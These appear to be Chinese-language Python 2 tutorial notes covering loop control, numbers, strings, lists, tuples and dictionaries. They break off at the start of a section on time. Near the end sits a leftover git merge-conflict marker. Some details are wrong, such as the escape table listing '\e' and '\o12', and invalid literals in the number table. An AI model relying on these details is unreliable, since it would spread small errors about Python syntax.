	break语句用来终止循环语句，即循环条件没有False条件或者序列还没被完全递归完，也会停止执行循环语句。
	break语句用在while和for循环中。
	如果您使用嵌套循环，break语句将停止执行最深层的循环，并开始执行下一行代码。
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	for letter in 'Python':     # 第一个实例
	   if letter == 'h':
		  break
	   print '当期字母 :', letter
	  
	var = 10                    # 第二个实例
	while var > 0:              
	   print '当期变量值 :', var
	   var = var -1
	   if var == 5:   # 当变量 var 等于 5 时退出循环
		  break
	 
	print "Good bye!"

Python continue 语句
	Python continue 语句跳出本次循环，而break跳出整个循环。
	continue 语句用来告诉Python跳过当前循环的剩余语句，然后继续进行下一轮循环。
	continue语句用在while和for循环中。
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		for letter in 'Python':     # 第一个实例
		   if letter == 'h':
			  continue
		   print '当前字母 :', letter
		 
		var = 10                    # 第二个实例
		while var > 0:              
		   var = var -1
		   if var == 5:
			  continue
		   print '当前变量值 :', var
		print "Good bye!"

Python pass 语句
	Python pass是空语句，是为了保持程序结构的完整性。
	pass 不做任何事情，一般用做占位语句。
		#!/usr/bin/python
		# -*- coding: UTF-8 -*- 

		# 输出 Python 的每个字母
		for letter in 'Python':
		   if letter == 'h':
			  pass
			  print '这是 pass 块'
		   print '当前字母 :', letter

		print "Good bye!"
	
	你在编写一个程序时，执行语句部分思路还没有完成，这时你可以用pass语句来占位，也可以当做是一个标记，是要过后来完成的代码。比如下面这样：
		def iplaypython():
		    pass
		定义一个函数iplaypython，但函数体部分暂时还没有完成，又不能空着不写内容，因此可以用pass来替代占个位置。

Python Number(数字)
	Python Number 数据类型用于存储数值。
	数据类型是不允许改变的,这就意味着如果改变 Number 数据类型的值，将重新分配内存空间。
	以下实例在变量赋值时 Number 对象将被创建：
	var1 = 1
	var2 = 10
	您也可以使用del语句删除一些 Number 对象引用。
	del语句的语法是：
	del var1[,var2[,var3[....,varN]]]]
	您可以通过使用del语句删除单个或多个对象，例如：
	del var
	del var_a, var_b
	Python 支持四种不同的数值类型：
		整型(Int) - 通常被称为是整型或整数，是正或负整数，不带小数点。
		长整型(long integers) - 无限大小的整数，整数最后是一个大写或小写的L。
		浮点型(floating point real values) - 浮点型由整数部分与小数部分组成，浮点型也可以使用科学计数法表示（2.5e2 = 2.5 x 102 = 250）
		复数(complex numbers) - 复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。
		int	long	float	complex
		10	51924361L	0.0	3.14j
		100	-0x19323L	15.20	45.j
		-786	0122L	-21.9	9.322e-36j
		080	0xDEFABCECBDAECBFBAEl	32.3+e18	.876j
		-0490	535633629843L	-90.	-.6545+0J
		-0x260	-052318172735L	-32.54e100	3e+26J
		0x69	-4721885298529L	70.2-E12	4.53e-7j
		长整型也可以使用小写"L"，但是还是建议您使用大写"L"，避免与数字"1"混淆。Python使用"L"来显示长整型。
		Python还支持复数，复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型

Python Number 类型转换
	int(x [,base ])         将x转换为一个整数  
	long(x [,base ])        将x转换为一个长整数  
	float(x )               将x转换到一个浮点数  
	complex(real [,imag ])  创建一个复数  
	str(x )                 将对象 x 转换为字符串  
	repr(x )                将对象 x 转换为表达式字符串  
	eval(str )              用来计算在字符串中的有效Python表达式,并返回一个对象  
	tuple(s )               将序列 s 转换为一个元组  
	list(s )                将序列 s 转换为一个列表  
	chr(x )                 将一个整数转换为一个字符  
	unichr(x )              将一个整数转换为Unicode字符  
	ord(x )                 将一个字符转换为它的整数值  
	hex(x )                 将一个整数转换为一个十六进制字符串  
	oct(x )                 将一个整数转换为一个八进制字符串  

Python数学函数
	函数	返回值 ( 描述 )
	abs(x)	返回数字的绝对值，如abs(-10) 返回 10
	ceil(x)	返回数字的上入整数，如math.ceil(4.1) 返回 5
	cmp(x, y)	如果 x < y 返回 -1, 如果 x == y 返回 0, 如果 x > y 返回 1
	exp(x)	返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045
	fabs(x)	返回数字的绝对值，如math.fabs(-10) 返回10.0
	floor(x)	返回数字的下舍整数，如math.floor(4.9)返回 4
	log(x)	如math.log(math.e)返回1.0,math.log(100,10)返回2.0
	log10(x)	返回以10为基数的x的对数，如math.log10(100)返回 2.0
	max(x1, x2,...)	返回给定参数的最大值，参数可以为序列。
	min(x1, x2,...)	返回给定参数的最小值，参数可以为序列。
	modf(x)	返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。
	pow(x, y)	x**y 运算后的值。
	round(x [,n])	返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。
	sqrt(x)	返回数字x的平方根

Python随机数函数
	随机数可以用于数学，游戏，安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。
	Python包含以下常用随机数函数：
	函数	描述
	choice(seq)	从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。
	randrange ([start,] stop [,step])	从指定范围内，按指定基数递增的集合中获取一个随机数，基数缺省值为1
	random()	随机生成下一个实数，它在[0,1)范围内。
	seed([x])	改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。
	shuffle(lst)	将序列的所有元素随机排序
	uniform(x, y)	随机生成下一个实数，它在[x,y]范围内。

Python三角函数
	Python包括以下三角函数：
	函数	描述
	acos(x)	返回x的反余弦弧度值。
	asin(x)	返回x的反正弦弧度值。
	atan(x)	返回x的反正切弧度值。
	atan2(y, x)	返回给定的 X 及 Y 坐标值的反正切值。
	cos(x)	返回x的弧度的余弦值。
	hypot(x, y)	返回欧几里德范数 sqrt(x*x + y*y)。
	sin(x)	返回的x弧度的正弦值。
	tan(x)	返回x弧度的正切值。
	degrees(x)	将弧度转换为角度,如degrees(math.pi/2) ， 返回90.0
	radians(x)	将角度转换为弧度

Python数学常量
	常量	描述
	pi	数学常量 pi（圆周率，一般以π来表示）
	e	数学常量 e，e即自然常数（自然常数）。		
	
	
Python 字符串
	字符串是 Python 中最常用的数据类型。我们可以使用引号('或")来创建字符串。
	创建字符串很简单，只要为变量分配一个值即可。例如：
	var1 = 'Hello World!'
	var2 = "Python Runoob"
	Python访问字符串中的值
	Python不支持单字符类型，单字符也在Python也是作为一个字符串使用。
	Python访问子字符串，可以使用方括号来截取字符串，如下实例：
	#!/usr/bin/python

	var1 = 'Hello World!'
	var2 = "Python Runoob"

	print "var1[0]: ", var1[0]
	print "var2[1:5]: ", var2[1:5]
	以上实例执行结果：
	var1[0]:  H
	var2[1:5]:  ytho
	
Python字符串更新
	你可以对已存在的字符串进行修改，并赋值给另一个变量，如下实例：
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	var1 = 'Hello World!'

	print "更新字符串 :- ", var1[:6] + 'Runoob!'
	以上实例执行结果
	更新字符串 :-  Hello Runoob!
	
	
Python转义字符
	在需要在字符中使用特殊字符时，python用反斜杠(\)转义字符。如下表：
	转义字符	描述
	\(在行尾时)	续行符
	\\	反斜杠符号
	\'	单引号
	\"	双引号
	\a	响铃
	\b	退格(Backspace)
	\e	转义
	\000	空
	\n	换行
	\v	纵向制表符
	\t	横向制表符
	\r	回车
	\f	换页
	\oyy	八进制数，yy代表的字符，例如：\o12代表换行
	\xyy	十六进制数，yy代表的字符，例如：\x0a代表换行
	\other	其它的字符以普通格式输出

Python字符串运算符
	下表实例变量 a 值为字符串 "Hello"，b 变量值为 "Python"：
	操作符		描述					实例		结果
	+		字符串连接				>>>a + b		'HelloPython'
	*		重复输出字符串			>>>a * 2		'HelloHello'
	[]	通过索引获取字符串中字符	>>>a[1]			'e'
	[ : ]	截取字符串中的一部分	>>>a[1:4]		'ell'
	in		成员运算符 - 如果字符串中包含给定的字符返回 True	>>>"H" in a True
	not in	成员运算符 - 如果字符串中不包含给定的字符返回 True	>>>"M" not in a	True
	r/R	原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母"r"（可以大小写）以外，与普通字符串有着几乎完全相同的语法。	>>>print r'\n'	\n			>>> print R'\n'	\n
	%	格式字符串	请看下一章节
	实例如下：
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	a = "Hello"
	b = "Python"

	print "a + b 输出结果：", a + b 
	print "a * 2 输出结果：", a * 2 
	print "a[1] 输出结果：", a[1] 
	print "a[1:4] 输出结果：", a[1:4] 

	if( "H" in a) :
		print "H 在变量 a 中" 
	else :
		print "H 不在变量 a 中" 

	if( "M" not in a) :
		print "M 不在变量 a 中" 
	else :
		print "M 在变量 a 中"

	print r'\n'
	print R'\n'
	以上程序执行结果为：
	a + b 输出结果： HelloPython
	a * 2 输出结果： HelloHello
	a[1] 输出结果： e
	a[1:4] 输出结果： ell
	H 在变量 a 中
	M 不在变量 a 中
	\n
	\n
	
Python 字符串格式化
	Python 支持格式化字符串的输出 。尽管这样可能会用到非常复杂的表达式，但最基本的用法是将一个值插入到一个有字符串格式符 %s 的字符串中。
		在 Python 中，字符串格式化使用与 C 中 sprintf 函数一样的语法。
		如下实例：
		#!/usr/bin/python
		print "My name is %s and weight is %d kg!" % ('Zara', 21) 
		以上实例输出结果：
		My name is Zara and weight is 21 kg!
		
	python字符串格式化符号:
		符号		描述
		  %c	 格式化字符及其ASCII码
		  %s	 格式化字符串
		  %d	 格式化整数
		  %u	 格式化无符号整型
		  %o	 格式化无符号八进制数
		  %x	 格式化无符号十六进制数
		  %X	 格式化无符号十六进制数（大写）
		  %f	 格式化浮点数字，可指定小数点后的精度
		  %e	 用科学计数法格式化浮点数
		  %E	 作用同%e，用科学计数法格式化浮点数
		  %g	 %f和%e的简写
		  %G	 %f 和 %E 的简写
		  %p	 用十六进制数格式化变量的地址
	格式化操作符辅助指令:
		符号	功能
		*	定义宽度或者小数点精度
		-	用做左对齐
		+	在正数前面显示加号( + )
		<sp>	在正数前面显示空格
		#	在八进制数前面显示零('0')，在十六进制前面显示'0x'或者'0X'(取决于用的是'x'还是'X')
		0	显示的数字前面填充'0'而不是默认的空格
		%	'%%'输出一个单一的'%'
		(var)	映射变量(字典参数)
		m.n.	m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)
	Python2.6 开始，新增了一种格式化字符串的函数 str.format()，它增强了字符串格式化的功能。
	
	Python三引号（triple quotes）
		python中三引号可以将复杂的字符串进行复制:
		python三引号允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符。
		三引号的语法是一对连续的单引号或者双引号（通常都是成对的用）。
			>>> hi = '''hi 
			there'''
			>>> hi   # repr()
			'hi\nthere'
			>>> print hi  # str()
			hi 
			there  
		三引号让程序员从引号和特殊字符串的泥潭里面解脱出来，自始至终保持一小块字符串的格式是所谓的WYSIWYG（所见即所得）格式的。
		一个典型的用例是，当你需要一块HTML或者SQL时，这时用字符串组合，特殊字符串转义将会非常的繁琐。
			errHTML = '''
			<HTML><HEAD><TITLE>
			Friends CGI Demo</TITLE></HEAD>
			<BODY><H3>ERROR</H3>
			<B>%s</B><P>
			<FORM><INPUT TYPE=button VALUE=Back
			ONCLICK="window.history.back()"></FORM>
			</BODY></HTML>
			'''
			cursor.execute('''
			CREATE TABLE users (  
			login VARCHAR(8), 
			uid INTEGER,
			prid INTEGER)
			''')
			
	Unicode 字符串
		Python 中定义一个 Unicode 字符串和定义一个普通字符串一样简单：
			>>> u'Hello World !'
			u'Hello World !'
			#引号前小写的"u"表示这里创建的是一个 Unicode 字符串。
		如果你想加入一个特殊字符，可以使用 Python 的 Unicode-Escape 编码。如下例所示：
			>>> u'Hello\u0020World !'
			u'Hello World !'
			被替换的 \u0020 标识表示在给定位置插入编码值为 0x0020 的 Unicode 字符（空格符）。

python的字符串内建函数
		字符串方法是从python1.6到2.0慢慢加进来的——它们也被加到了Jython中。这些方法实现了string模块的大部分方法，如下表所示列出了目前字符串内建支持的方法，所有的方法都包含了对Unicode的支持，有一些甚至是专门用于Unicode的。
			方法															描述
			string.capitalize()									把字符串的第一个字符大写
			string.center(width)								返回一个原字符串居中,并使用空格填充至长度 width 的新字符串
			string.count(str, beg=0, end=len(string))			返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数
			string.encode(encoding='UTF-8', errors='strict')	以 encoding 指定的编码格式编码 string，如果出错默认报一个ValueError 的异常，除非 errors 指定的是'ignore'或者'replace'
			string.endswith(obj, beg=0, end=len(string))		检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False.
			string.expandtabs(tabsize=8)						把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8。
			string.find(str, beg=0, end=len(string))			检测 str 是否包含在 string 中，如果 beg 和 end 指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回-1
			string.format()										格式化字符串
			string.index(str, beg=0, end=len(string))			跟find()方法一样，只不过如果str不在 string中会报一个异常.
			string.isalnum()									如果 string 至少有一个字符并且所有字符都是字母或数字则返回 True,否则返回 False
			string.isalpha()									如果 string 至少有一个字符并且所有字符都是字母则返回 True,否则返回 False
			string.isdecimal()									如果 string 只包含十进制数字则返回 True 否则返回 False.
			string.isdigit()									如果 string 只包含数字则返回 True 否则返回 False.
			string.islower()									如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False
			string.isnumeric()									如果 string 中只包含数字字符，则返回 True，否则返回 False
			string.isspace()									如果 string 中只包含空格，则返回 True，否则返回 False.
			string.istitle()									如果 string 是标题化的(见 title())则返回 True，否则返回 False
			string.isupper()									如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True，否则返回 False
			string.join(seq)									以 string 作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串
			string.ljust(width)									返回一个原字符串左对齐,并使用空格填充至长度 width 的新字符串
			string.lower()										转换 string 中所有大写字符为小写.
			string.lstrip()										截掉 string 左边的空格
			string.maketrans(intab, outtab])					maketrans() 方法用于创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。
			max(str)											返回字符串 str 中最大的字母。
			min(str)											返回字符串 str 中最小的字母。
			string.partition(str)								有点像 find()和 split()的结合体,从 str 出现的第一个位置起,把 字 符 串 string 分 成 一 个 3 元 素 的 元 组 (string_pre_str,str,string_post_str),如果 string 中不包含str 则 string_pre_str == string.
			string.replace(str1, str2,  num=string.count(str1))	把 string 中的 str1 替换成 str2,如果 num 指定，则替换不超过 num 次.
			string.rfind(str, beg=0,end=len(string) )			类似于 find()函数，不过是从右边开始查找.
			string.rindex( str, beg=0,end=len(string))			类似于 index()，不过是从右边开始.
			string.rjust(width)									返回一个原字符串右对齐,并使用空格填充至长度 width 的新字符串
			string.rpartition(str)								类似于 partition()函数,不过是从右边开始查找.
			string.rstrip()										删除 string 字符串末尾的空格.
			string.split(str="", num=string.count(str))			以 str 为分隔符切片 string，如果 num有指定值，则仅分隔 num 个子字符串
			string.splitlines([keepends])						按照行('\r', '\r\n', \n')分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。
			string.startswith(obj, beg=0,end=len(string))		检查字符串是否是以 obj 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查.
			string.strip([obj])									在 string 上执行 lstrip()和 rstrip()
			string.swapcase()									翻转 string 中的大小写
			string.title()										返回"标题化"的 string,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())
			string.translate(str, del="")						根据 str 给出的表(包含 256 个字符)转换 string 的字符,要过滤掉的字符放到 del 参数中
			string.upper()										转换 string 中的小写字母为大写
			string.zfill(width)									返回长度为 width 的字符串，原字符串 string 右对齐，前面填充0
			string.isdecimal()									isdecimal()方法检查字符串是否只包含十进制字符。这种方法只存在于unicode对象。		


Python 列表(List)
	序列是Python中最基本的数据结构。序列中的每个元素都分配一个数字 - 它的位置，或索引，第一个索引是0，第二个索引是1，依此类推。
		Python有6个序列的内置类型，但最常见的是列表和元组。
		序列都可以进行的操作包括索引，切片，加，乘，检查成员。
		此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。
	列表是最常用的Python数据类型，它可以作为一个方括号内的逗号分隔值出现。
		列表的数据项不需要具有相同的类型
		创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可。如下所示：
			list1 = ['physics', 'chemistry', 1997, 2000];
			list2 = [1, 2, 3, 4, 5 ];
			list3 = ["a", "b", "c", "d"];
		与字符串的索引一样，列表索引从0开始。列表可以进行截取、组合等。
		访问列表中的值
			使用下标索引来访问列表中的值，同样你也可以使用方括号的形式截取字符，如下所示：
			#!/usr/bin/python

			list1 = ['physics', 'chemistry', 1997, 2000];
			list2 = [1, 2, 3, 4, 5, 6, 7 ];

			print "list1[0]: ", list1[0]
			print "list2[1:5]: ", list2[1:5]
			以上实例输出结果：
			list1[0]:  physics
			list2[1:5]:  [2, 3, 4, 5]
		更新列表
			你可以对列表的数据项进行修改或更新，你也可以使用append()方法来添加列表项，如下所示：
			#!/usr/bin/python

			list = ['physics', 'chemistry', 1997, 2000];

			print "Value available at index 2 : "
			print list[2];
			list[2] = 2001;
			print "New value available at index 2 : "
			print list[2];
			注意：我们会在接下来的章节讨论append()方法的使用
			以上实例输出结果：
			Value available at index 2 :
			1997
			New value available at index 2 :
			2001
		删除列表元素
			可以使用 del 语句来删除列表的的元素，如下实例：
			#!/usr/bin/python

			list1 = ['physics', 'chemistry', 1997, 2000];

			print list1;
			del list1[2];
			print "After deleting value at index 2 : "
			print list1;
			以上实例输出结果：
			['physics', 'chemistry', 1997, 2000]
			After deleting value at index 2 :
			['physics', 'chemistry', 2000]
			注意：我们会在接下来的章节讨论remove()方法的使用
		Python列表脚本操作符
			列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。
			如下所示：
			Python表达式					结果							描述
			len([1, 2, 3])					3								长度
			[1, 2, 3] + [4, 5, 6]			[1, 2, 3, 4, 5, 6]				组合
			['Hi!'] * 4						['Hi!', 'Hi!', 'Hi!', 'Hi!']	重复
			3 in [1, 2, 3]					True							元素是否存在于列表中
			for x in [1, 2, 3]: print x,	1 2 3							迭代
		Python列表截取
			Python 的列表截取实例如下：
			>>> L = ['Google', 'Runoob', 'Taobao']
			>>> L[2]
			'Taobao'
			>>> L[-2]
			'Runoob'
			>>> L[1:]
			['Runoob', 'Taobao']
			>>> 
			描述：
			Python 表达式	结果	描述
			L[2]	'Taobao'	读取列表中第三个元素
			L[-2]	'Runoob'	读取列表中倒数第二个元素
			L[1:]	['Runoob', 'Taobao']	从第二个元素开始截取列表
		Python列表函数&方法
			Python包含以下函数:
				序号	函数
				1	cmp(list1, list2)	比较两个列表的元素
				2	len(list)			列表元素个数
				3	max(list)			返回列表元素最大值
				4	min(list)			返回列表元素最小值
				5	list(seq)			将元组转换为列表
			Python包含以下方法:
				序号	方法
				1	list.append(obj)		在列表末尾添加新的对象
				2	list.count(obj)			统计某个元素在列表中出现的次数
				3	list.extend(seq)		在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）
				4	list.index(obj)			从列表中找出某个值第一个匹配项的索引位置
				5	list.insert(index, obj)	将对象插入列表
				6	list.pop(obj=list[-1])	移除列表中的一个元素（默认最后一个元素），并且返回该元素的值
				7	list.remove(obj)		移除列表中某个值的第一个匹配项
				8	list.reverse()			反向列表中元素
				9	list.sort([func])		对原列表进行排序			
				
		
		python 创建二维列表，将需要的参数写入 cols 和 rows 即可
			list_2d = [[0 for col in range(cols)] for row in range(rows)]
			实例：
			>>> list_2d = [ [0 for i in range(5)] for i in range(5)]
			>>> list_2d[0].append(3)
			>>> list_2d[0].append(5)
			>>> list_2d[2].append(7)
			>>> list_2d
			[[0, 0, 0, 0, 0, 3, 5], [0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 7], [0, 0, 0, 0, 0], [0, 0, 0, 0, 0]]		
			

Python 元组
	Python的元组与列表类似，不同之处在于元组的元素不能修改，可以看作只读列表。
	元组使用小括号，列表使用方括号。
	元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。
		如下实例：
		tup1 = ('physics', 'chemistry', 1997, 2000);
		tup2 = (1, 2, 3, 4, 5 );
		tup3 = "a", "b", "c", "d";
	
	创建空元组
		tup1 = ();
	元组中只包含一个元素时，需要在元素后面添加逗号
		tup1 = (50,);
	访问元组
		元组与字符串类似，下标索引从0开始，可以进行截取，组合等。
		元组可以使用下标索引来访问元组中的值，如下实例:
		#!/usr/bin/python

		tup1 = ('physics', 'chemistry', 1997, 2000);
		tup2 = (1, 2, 3, 4, 5, 6, 7 );

		print "tup1[0]: ", tup1[0]
		print "tup2[1:5]: ", tup2[1:5]
		
		以上实例输出结果：
		tup1[0]:  physics
		tup2[1:5]:  (2, 3, 4, 5)
		
	修改元组
		元组中的元素值是不允许修改的，但我们可以对元组进行连接组合，如下实例:
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-

		tup1 = (12, 34.56);
		tup2 = ('abc', 'xyz');

		# 以下修改元组元素操作是非法的。
		# tup1[0] = 100;

		# 创建一个新的元组
		tup3 = tup1 + tup2;
		print tup3;
		
		以上实例输出结果：
		(12, 34.56, 'abc', 'xyz')
		
	删除元组
		元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组，如下实例:
		#!/usr/bin/python

		tup = ('physics', 'chemistry', 1997, 2000);

		print tup;
		del tup;
		print "After deleting tup : "
		print tup;
		
		以上实例元组被删除后，输出变量会有异常信息，输出如下所示：
		('physics', 'chemistry', 1997, 2000)
		After deleting tup :
		Traceback (most recent call last):
		  File "test.py", line 9, in <module>
			print tup;
		NameError: name 'tup' is not defined
		
	元组运算符
		与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。
		Python 表达式	结果	描述
		len((1, 2, 3))	3	计算元素个数
		(1, 2, 3) + (4, 5, 6)	(1, 2, 3, 4, 5, 6)	连接
		('Hi!',) * 4	('Hi!', 'Hi!', 'Hi!', 'Hi!')	复制
		3 in (1, 2, 3)	True	元素是否存在
		for x in (1, 2, 3): print x,	1 2 3	迭代
		
	元组索引，截取
		因为元组也是一个序列，所以我们可以访问元组中的指定位置的元素，也可以截取索引中的一段元素，如下所示：
		元组：
		L = ('spam', 'Spam', 'SPAM!')
		Python 表达式	结果	描述
		L[2]	'SPAM!'	读取第三个元素
		L[-2]	'Spam'	反向读取；读取倒数第二个元素
		L[1:]	('Spam', 'SPAM!')	截取元素

	无关闭分隔符
		任意无符号的对象，以逗号隔开，默认为元组，如下实例：
		#!/usr/bin/python

		print 'abc', -4.24e93, 18+6.6j, 'xyz';
		x, y = 1, 2;
		print "Value of x , y : ", x,y;
		
		以上实例运行结果：
		abc -4.24e+93 (18+6.6j) xyz
		Value of x , y : 1 2
	
	元组内置函数
		Python元组包含了以下内置函数
		序号	方法及描述
		1	cmp(tuple1, tuple2)
		比较两个元组元素。
		2	len(tuple)
		计算元组元素个数。
		3	max(tuple)
		返回元组中元素最大值。
		4	min(tuple)
		返回元组中元素最小值。
		5	tuple(seq)
		将列表转换为元组。
		

Python 字典(Dictionary)
	字典是另一种可变容器模型，且可存储任意类型对象。
	字典的每个键值(key=>value)对用冒号(:)分割，每个对之间用逗号(,)分割，整个字典包括在花括号({})中 ,格式如下所示：
		d = {key1 : value1, key2 : value2 }
	键必须是唯一的，但值则不必。
	值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组。

	一个简单的字典实例：
		dict = {'Alice': '2341', 'Beth': '9102', 'Cecil': '3258'}
	也可如此创建字典：
		dict1 = { 'abc': 456 };
		dict2 = { 'abc': 123, 98.6: 37 };
	
	访问字典里的值
		把相应的键放入方括弧，如下实例:
		实例
		#!/usr/bin/python
		 
		dict = {'Name': 'Zara', 'Age': 7, 'Class': 'First'};
		 
		print "dict['Name']: ", dict['Name'];
		print "dict['Age']: ", dict['Age'];
		
		以上实例输出结果：
		dict['Name']:  Zara
		dict['Age']:  7
	
	如果用字典里没有的键访问数据，会输出错误如下：
		实例
		#!/usr/bin/python
		 
		dict = {'Name': 'Zara', 'Age': 7, 'Class': 'First'};
		 
		print "dict['Alice']: ", dict['Alice'];
		
		以上实例输出结果：
		dict['Alice']: 
		Traceback (most recent call last):
		  File "test.py", line 5, in <module>
			print "dict['Alice']: ", dict['Alice'];
		KeyError: 'Alice'

	修改字典
		向字典添加新内容的方法是增加新的键/值对，修改或删除已有键/值对如下实例:
		实例
		#!/usr/bin/python
		 
		dict = {'Name': 'Zara', 'Age': 7, 'Class': 'First'};
		 
		dict['Age'] = 8; # update existing entry
		dict['School'] = "DPS School"; # Add new entry
		 
		 
		print "dict['Age']: ", dict['Age'];
		print "dict['School']: ", dict['School'];
		
		以上实例输出结果：
		dict['Age']:  8
		dict['School']:  DPS School

	删除字典元素
		能删单一的元素也能清空字典，清空只需一项操作。
		显示删除一个字典用del命令，如下实例：
		实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		dict = {'Name': 'Zara', 'Age': 7, 'Class': 'First'};
		 
		del dict['Name']; # 删除键是'Name'的条目
		dict.clear();     # 清空词典所有条目
		del dict ;        # 删除词典
		 
		print "dict['Age']: ", dict['Age'];
		print "dict['School']: ", dict['School'];
		
		但这会引发一个异常，因为用del后字典不再存在：
		dict['Age']:
		Traceback (most recent call last):
		  File "test.py", line 8, in <module>
			print "dict['Age']: ", dict['Age'];
		TypeError: 'type' object is unsubscriptable
		注：del()方法后面也会讨论。

	字典键的特性
		字典值可以没有限制地取任何python对象，既可以是标准的对象，也可以是用户定义的，但键不行。
		两个重要的点需要记住：
		1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住，如下实例：
		实例
		#!/usr/bin/python
		 
		dict = {'Name': 'Zara', 'Age': 7, 'Name': 'Manni'};
		 
		print "dict['Name']: ", dict['Name'];
		以上实例输出结果：
		dict['Name']:  Manni
		2）键必须不可变，所以可以用数字，字符串或元组充当，所以用列表就不行，如下实例：
		实例
		#!/usr/bin/python
		 
		dict = {['Name']: 'Zara', 'Age': 7};
		 
		print "dict['Name']: ", dict['Name'];
		
		以上实例输出结果：
		Traceback (most recent call last):
		  File "test.py", line 3, in <module>
			dict = {['Name']: 'Zara', 'Age': 7};
		TypeError: list objects are unhashable

字典内置函数&方法
	Python字典包含了以下内置函数：
	序号	函数及描述
	1	cmp(dict1, dict2)
	比较两个字典元素。
	2	len(dict)
	计算字典元素个数，即键的总数。
	3	str(dict)
	输出字典可打印的字符串表示。
	4	type(variable)
	返回输入的变量类型，如果变量是字典就返回字典类型。
	Python字典包含了以下内置方法：
	序号	函数及描述
	1	dict.clear()
	删除字典内所有元素
	2	dict.copy()
	返回一个字典的浅复制
	3	dict.fromkeys(seq[, val]))
	创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值
	4	dict.get(key, default=None)
	返回指定键的值，如果值不在字典中返回default值
	5	dict.has_key(key)
	如果键在字典dict里返回true，否则返回false
	6	dict.items()
	以列表返回可遍历的(键, 值) 元组数组
	7	dict.keys()
	以列表返回一个字典所有的键
	8	dict.setdefault(key, default=None)
	和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default
	9	dict.update(dict2)
	把字典dict2的键/值对更新到dict里
	10	dict.values()
	以列表返回字典中的所有值
	11	pop(key[,default])
	删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。
	12	popitem()
	随机返回并删除字典中的一对键和值。
	
	

<<<<<<< HEAD
	
=======
Python 日期和时间

	Python 程序能用很多方式处理日期和时间，转换日期格式是一个常见的功能。
	Python 提供了一个 time 和 calendar 模块可以用于格式化日期和时间。
	时间间隔是以秒为单位的浮点小数。
	每个时间戳都以自从1970年1月1日午夜（历元）经过了多长时间来表示。

	Python 的 time 模块下有很多函数可以转换常见日期格式。如函数time.time()用于获取当前时间戳, 如下实例:
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-

		import time;  # 引入time模块

		ticks = time.time()
		print "当前时间戳为:", ticks

		以上实例输出结果：

		当前时间戳为: 1459994552.51
		#时间戳单位最适于做日期运算。但是1970年之前的日期就无法以此表示了。太遥远的日期也不行，UNIX和Windows只支持到2038年。

	什么是时间元组？
		很多Python函数用一个元组装起来的9组数字处理时间:
		序号 	字段	值
		0	4位数年	2008
		1	月	1 到 12
		2	日	1到31
		3	小时	0到23
		4	分钟	0到59
		5	秒	0到61 (60或61 是闰秒)
		6	一周的第几日	0到6 (0是周一)
		7	一年的第几日	1到366 (儒略历)
		8	夏令时	-1, 0, 1, -1是决定是否为夏令时的旗帜

		上述也就是struct_time元组。这种结构具有如下属性：
		序号	属性	值
		0	tm_year	2008
		1	tm_mon	1 到 12
		2	tm_mday	1 到 31
		3	tm_hour	0 到 23
		4	tm_min	0 到 59
		5	tm_sec	0 到 61 (60或61 是闰秒)
		6	tm_wday	0到6 (0是周一)
		7	tm_yday	1 到 366(儒略历)
		8	tm_isdst	-1, 0, 1, -1是决定是否为夏令时的旗帜

	获取当前时间
		从返回浮点数的时间辍方式向时间元组转换，只要将浮点数传递给如localtime之类的函数。

		#!/usr/bin/python
		# -*- coding: UTF-8 -*-

		import time

		localtime = time.localtime(time.time())
		print "本地时间为 :", localtime

		以上实例输出结果：

		本地时间为 : time.struct_time(tm_year=2016, tm_mon=4, tm_mday=7, tm_hour=10, tm_min=3, tm_sec=27, tm_wday=3, tm_yday=98, tm_isdst=0)


	获取格式化的时间
